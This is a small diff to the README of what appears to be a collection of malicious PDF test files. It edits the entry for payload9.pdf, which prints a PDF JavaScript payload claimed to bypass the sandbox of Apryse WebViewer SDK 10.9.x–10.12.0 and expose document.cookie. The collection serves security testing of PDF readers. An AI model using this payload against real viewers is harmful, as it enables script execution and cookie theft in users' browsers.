@@ -100,7 +100,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 
 ### payload9.pdf
 
-Javascript sandbox bypass in Apryse WebViewer SDK (10.9.x - 10.12.0) to run arbitrary embedded Javascript in PDFs.
+**Line 32**. Javascript sandbox bypass in Apryse WebViewer SDK (10.9.x - 10.12.0) to run arbitrary embedded Javascript in PDFs.
 ```
 /JS (app.alert\(1\); console.println\(delete window\); console.println\(delete confirm\); console.println\(delete document\); window.confirm\(document.cookie\);)
 ```
